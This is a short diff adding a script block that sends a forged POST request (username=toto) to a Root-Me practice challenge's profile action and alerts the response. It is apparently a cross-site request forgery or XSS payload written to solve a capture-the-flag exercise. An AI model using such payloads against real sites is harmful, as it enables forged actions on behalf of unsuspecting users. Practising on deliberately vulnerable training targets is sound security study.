@@ -1,0 +1,12 @@
+<script>
+var post_data = 'username=toto';
+var xmlhttp=new XMLHttpRequest();
+xmlhttp.open("POST",'http://challenge01.root-me.org/web-client/ch22/?action=profile', true);
+xmlhttp.onreadystatechange = function () { 
+if (xmlhttp.readyState == 4) 
+{ 
+   alert(xmlhttp.responseText);
+} 
+}; 
+xmlhttp.send(post_data);
+</script>
